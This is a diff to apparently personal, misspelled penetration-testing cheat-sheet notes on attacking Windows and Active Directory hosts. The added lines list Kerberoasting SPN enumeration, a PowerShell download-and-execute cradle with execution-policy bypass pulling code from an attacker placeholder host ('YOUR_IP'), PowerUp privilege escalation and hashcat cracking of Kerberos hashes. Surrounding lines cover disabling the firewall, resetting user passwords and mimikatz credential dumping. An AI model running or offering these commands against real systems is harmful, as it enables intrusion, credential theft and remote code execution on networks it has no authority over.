@@ -6,14 +6,20 @@
   gpupdate /force      #update the gp group policy. \n
   net share sharename=c:\foldername          # share a folder
   setspn HTTP/nameofhost(sql.inmy.com) inmy\sqladmin
+>setspn -T medin -Q ​ */*  //to extract all accouint in SPN, when we have a normal user in a hsot in AD
+>
+  //pwershell to downlaod file
+      powershell -ep bypass;
+      iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/xx')
+      or curl http://xxx/xx -o xx
   >net accounts    /login policy
   >Write-Output "${env:COMPUTERNAME}"  //get computername
   //if the display of shell is not recgnized,
->    chcp 65001  //change to utf encode
+    chcp 65001  //change to utf encode
 
-  netstat -nao //check the services running on Win
-
-  net user $username $passwd  //change the passwd of a user
+    netstat -nao //check the services running on Win
+  
+    net user $username $passwd  //change the passwd of a user
   #### turn off firewall
     $netsh advirewall set allprofiles state off
   #### check firewall status
@@ -46,8 +52,11 @@
     Get_NetSession -ComputerName $computerName  #get other user which has net session with this host& not guarantee to use
       
     Get-NetLoggedon -ComputerName $cumputername # get remote access from other user. & not guarantee to use
-
-
+####  PowerUp1.ps1
+  get Administrator access.
+    the result will be :  C:\Windows\Panther\Unattend\Unattended.xml.
+####passwd hash format of win
+  hashcat -m 13100
 ### mimikaz :to get the hash of remote access admin
   privilege::debug    #run this first, to test the privi of mimikaz
 
